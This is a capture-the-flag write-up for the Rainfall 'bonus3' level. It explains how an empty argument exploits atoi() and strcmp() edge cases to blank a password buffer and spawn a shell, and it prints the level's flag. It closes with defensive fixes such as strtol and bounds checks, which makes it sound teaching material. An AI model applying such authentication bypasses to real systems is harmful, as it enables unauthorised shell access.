# Bonus3 - atoi() Logic Vulnerability

## Table of Contents
1. [Overview](#overview)
2. [The atoi() Function](#the-atoi-function)
3. [The strcmp() Function](#the-strcmp-function)
4. [Vulnerability Analysis](#vulnerability-analysis)
5. [Exploitation Strategy](#exploitation-strategy)
6. [Step-by-Step Execution](#step-by-step-execution)
7. [Why This Works](#why-this-works)
8. [Alternative Approaches](#alternative-approaches)
9. [Security Implications](#security-implications)
10. [Prevention](#prevention)

---

## Overview

**Challenge Type**: Logic Vulnerability  
**Difficulty**: Easy (once you understand the trick)  
**Technique**: atoi() edge case + strcmp() manipulation  
**Target**: Execute /bin/sh by making buffer empty

Bonus3 demonstrates a logic vulnerability where understanding the edge cases of `atoi()` and `strcmp()` allows us to bypass authentication and execute a shell.

---

## The atoi() Function

### Function Signature

```c
int atoi(const char *str);
```

### Behavior

`atoi()` converts a string to an integer:

1. Skips leading whitespace
2. Reads optional sign (+ or -)
3. Reads digits until non-digit character
4. Returns integer value
5. **Returns 0 if no valid conversion**

### Edge Cases

```c
atoi("")           → 0  // Empty string!
atoi("0")          → 0
atoi("abc")        → 0  // No digits
atoi("  123")      → 123
atoi("-456")       → -456
atoi("123abc")     → 123  // Stops at 'a'
atoi("2147483648") → undefined (overflow)
```

### The Critical Edge Case

```c
atoi("") == 0  // This is the key!
```

---

## The strcmp() Function

### Function Signature

```c
int strcmp(const char *s1, const char *s2);
```

### Behavior

`strcmp()` compares two strings:

1. Compares byte by byte
2. Stops at first null terminator
3. Returns 0 if strings are equal
4. Returns < 0 if s1 < s2
5. Returns > 0 if s1 > s2

### Examples

```c
strcmp("", "")      → 0  // Both empty!
strcmp("a", "a")    → 0
strcmp("a", "b")    → -1
strcmp("b", "a")    → 1
strcmp("abc", "ab") → positive
strcmp("", "a")     → negative
```

### The Critical Behavior

```c
strcmp("", "") == 0  // Empty strings are equal!
```

---

## Vulnerability Analysis

### The Code

```c
int main(int argc, char **argv) {
    FILE *file;
    char buffer[132];
    int index;
    
    file = fopen("/home/user/end/.pass", "r");
    memset(buffer, 0, 132);
    
    if (file == NULL || argc != 2) {
        return -1;
    }
    
    // Read 66 bytes from password file
    fread(buffer, 1, 66, file);
    
    // Set null terminator at position 89
    buffer[89] = '\0';
    
    // Convert argv[1] to integer
    index = atoi(argv[1]);
    
    // VULNERABILITY: Set null byte at buffer[index]
    // No bounds checking!
    buffer[index] = '\0';
    
    // Read another 65 bytes
    fread(buffer + 66, 1, 65, file);
    
    fclose(file);
    
    // Compare buffer with argv[1]
    if (strcmp(buffer, argv[1]) == 0) {
        execl("/bin/sh", "sh", NULL);  // WIN!
    }
    else {
        puts(buffer + 66);
    }
    
    return 0;
}
```

### The Vulnerability

**Three issues**:

1. **No input validation**: Empty string is accepted
2. **Unchecked array indexing**: `buffer[index]` with no bounds check
3. **Logic flaw**: Comparing buffer with user input for authentication

---

## Exploitation Strategy

### The Trick

```
Input: ./bonus3 ""

1. atoi("") returns 0
2. buffer[0] = '\0' makes buffer empty
3. strcmp("", "") returns 0
4. Shell is executed!
```

### Why It Works

```c
// Before buffer[0] = '\0'
buffer = "3321b6f81659f9a71c76616f606e4b50189cecfea611393d5d649f75e157353c\n..."

// After buffer[0] = '\0'
buffer = ""  // Empty string!

// Comparison
strcmp("", "") == 0  ✓
```

### Memory Layout

```
Before buffer[0] = '\0':
┌─────────────────────────────────────────────────────┐
│ buffer[0]: '3'                                      │
│ buffer[1]: '3'                                      │
│ buffer[2]: '2'                                      │
│ ...                                                 │
│ buffer[65]: '\n'                                    │
├─────────────────────────────────────────────────────┤
│ buffer[66-130]: second read                         │
└─────────────────────────────────────────────────────┘

After buffer[0] = '\0':
┌─────────────────────────────────────────────────────┐
│ buffer[0]: '\0' ← String ends here!                 │
│ buffer[1]: '3'  ← Ignored by strcmp()               │
│ buffer[2]: '2'  ← Ignored by strcmp()               │
│ ...                                                 │
└─────────────────────────────────────────────────────┘

strcmp() only reads until first null byte!
```

---

## Step-by-Step Execution

### 1. Run the Exploit

```bash
./bonus3 ""
```

### 2. Execution Flow

```
Step 1: main() starts
  argc = 2
  argv[1] = ""

Step 2: Open password file
  file = fopen("/home/user/end/.pass", "r")
  Success!

Step 3: Initialize buffer
  memset(buffer, 0, 132)
  buffer = all zeros

Step 4: Read password
  fread(buffer, 1, 66, file)
  buffer = "3321b6f81659f9a71c76616f606e4b50189cecfea611393d5d649f75e157353c\n"

Step 5: Set null terminator
  buffer[89] = '\0'
  (Ensures buffer is null-terminated)

Step 6: Convert argv[1] to integer
  index = atoi("")
  index = 0  ← KEY!

Step 7: Set null byte at buffer[0]
  buffer[0] = '\0'
  buffer is now: ""  ← Empty string!

Step 8: Read more data
  fread(buffer + 66, 1, 65, file)
  (Doesn't matter, buffer[0] is already '\0')

Step 9: Close file
  fclose(file)

Step 10: Compare strings
  strcmp(buffer, argv[1])
  strcmp("", "")
  Returns: 0  ← Equal!

Step 11: Execute shell
  execl("/bin/sh", "sh", NULL)
  Shell spawned! ✓
```

### 3. Get Flag

```bash
$ cat /home/user/end/.pass
3321b6f81659f9a71c76616f606e4b50189cecfea611393d5d649f75e157353c
```

---

## Why This Works

### The Chain of Events

```
Empty string → atoi() returns 0 → buffer[0] = '\0' → buffer is empty → strcmp() returns 0 → Shell!
```

### Key Insights

1. **atoi("") == 0**: Empty string converts to 0
2. **buffer[0] = '\0'**: Makes buffer an empty string
3. **strcmp("", "") == 0**: Empty strings are equal
4. **No validation**: Program doesn't check for empty input

---

## Alternative Approaches

### Approach 1: Using "0"

```bash
./bonus3 "0"
```

**Result**: Doesn't work!

**Why**:
```c
atoi("0") = 0
buffer[0] = '\0'
strcmp("", "0") != 0  ✗
```

### Approach 2: Using Non-Numeric String

```bash
./bonus3 "abc"
```

**Result**: Doesn't work!

**Why**:
```c
atoi("abc") = 0
buffer[0] = '\0'
strcmp("", "abc") != 0  ✗
```

### Approach 3: Using Whitespace

```bash
./bonus3 " "
```

**Result**: Doesn't work!

**Why**:
```c
atoi(" ") = 0
buffer[0] = '\0'
strcmp("", " ") != 0  ✗
```

### Why Only Empty String Works

```c
strcmp("", "") == 0  ✓  // Only this is true!
strcmp("", "0") != 0  ✗
strcmp("", "abc") != 0  ✗
strcmp("", " ") != 0  ✗
```

---

## Security Implications

### 1. atoi() is Unsafe

```c
// PROBLEM: No error indication
int val = atoi(user_input);
// If user_input is invalid, val = 0
// Can't distinguish between "0" and error!

// SOLUTION: Use strtol()
char *endptr;
long val = strtol(user_input, &endptr, 10);
if (*endptr != '\0') {
    // Error: invalid input
}
```

### 2. Unchecked Array Indexing

```c
// VULNERABLE
index = atoi(argv[1]);
buffer[index] = '\0';  // No bounds check!

// SAFE
index = atoi(argv[1]);
if (index < 0 || index >= sizeof(buffer)) {
    return -1;
}
buffer[index] = '\0';
```

### 3. Logic Flaw in Authentication

```c
// VULNERABLE
if (strcmp(buffer, argv[1]) == 0) {
    execl("/bin/sh", "sh", NULL);
}

// This is fundamentally flawed!
// Don't execute shell based on string comparison
```

### 4. No Input Validation

```c
// VULNERABLE
// Accepts any input, including empty string

// SAFE
if (argc != 2 || strlen(argv[1]) == 0) {
    return -1;
}
```

---

## Prevention

### 1. Validate Input

```c
if (argc != 2) {
    fprintf(stderr, "Usage: %s <index>\n", argv[0]);
    return 1;
}

if (strlen(argv[1]) == 0) {
    fprintf(stderr, "Error: Empty input not allowed\n");
    return 1;
}
```

### 2. Use strtol() Instead of atoi()

```c
#include <errno.h>
#include <limits.h>

char *endptr;
long val;

errno = 0;
val = strtol(argv[1], &endptr, 10);

// Check for conversion errors
if (errno != 0) {
    perror("strtol");
    return 1;
}

// Check if entire string was converted
if (*endptr != '\0') {
    fprintf(stderr, "Error: Invalid number\n");
    return 1;
}

// Check range
if (val < 0 || val >= sizeof(buffer)) {
    fprintf(stderr, "Error: Index out of bounds\n");
    return 1;
}
```

### 3. Bounds Checking

```c
int index = atoi(argv[1]);

if (index < 0 || index >= sizeof(buffer)) {
    fprintf(stderr, "Error: Index %d out of bounds [0, %zu)\n", 
            index, sizeof(buffer));
    return 1;
}

buffer[index] = '\0';
```

### 4. Don't Execute Based on User Input

```c
// NEVER DO THIS
if (strcmp(buffer, argv[1]) == 0) {
    execl("/bin/sh", "sh", NULL);
}

// Use proper authentication:
// - Cryptographic hash comparison
// - Time-constant comparison
// - Proper privilege separation
// - Multi-factor authentication
```

---

## Flag

```
3321b6f81659f9a71c76616f606e4b50189cecfea611393d5d649f75e157353c
```

---

## Congratulations! 🎉

You've completed all 14 levels of Rainfall:

- **level0-9**: 10 mandatory levels
- **bonus0-3**: 4 bonus levels

### Skills Learned

1. Buffer overflows
2. Format string vulnerabilities
3. ret2libc exploitation
4. Heap manipulation
5. GOT overwrite
6. vtable hijacking
7. Integer overflow
8. Logic vulnerabilities
9. And much more!

Great job! 🏆

